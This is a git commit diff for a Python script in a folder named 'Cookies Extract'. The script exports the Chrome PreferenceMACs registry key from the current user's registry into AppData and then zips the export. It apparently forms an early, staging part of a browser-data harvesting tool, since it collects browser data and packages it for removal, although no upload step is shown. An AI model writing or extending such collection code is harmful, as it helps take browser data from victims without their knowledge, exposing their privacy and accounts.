a889cdcd3ae3967c46f8ae92da55255fb4aed2be
tensazangesto98754 <tensazangesto98754@gmail.com>
2024-03-08 11:24:24 +0330

    get data and zip it

--- Cookies Extract/extractDataFromREG.py
+++ Cookies Extract/extractDataFromREG.py
@@ -1,8 +1,22 @@
-from os import system, environ
+from os import system, path, environ
+from zipfile import ZipFile
+
+Path = "C:\\Users\\%USERNAME%\\AppData\\export.reg"
+
 # define function that get data from registry by bath script
 def getData():
-    system("reg export HKEY_CURRENT_USER\Software\Google\Chrome\PreferenceMACs C:\Web\export.txt")
+    system(f"REG EXPORT HKEY_CURRENT_USER\\Software\\Google\\Chrome\\PreferenceMACs {Path}")
+    return True
 
 
-
+def CreateZip():
+    if path.exists(environ['USERPROFILE'] + fr"/AppData/export.reg"):
+        with ZipFile(f"{environ['USERPROFILE']}" + fr"/AppData/reg.zip", "w") as ZipObj:
+            try:
+                ZipObj.write(f"{environ['USERPROFILE']}" + fr"/AppData/export.reg")
+                return True
+            except Exception as e:
+                return e
 getData()
+CreateZip()
+
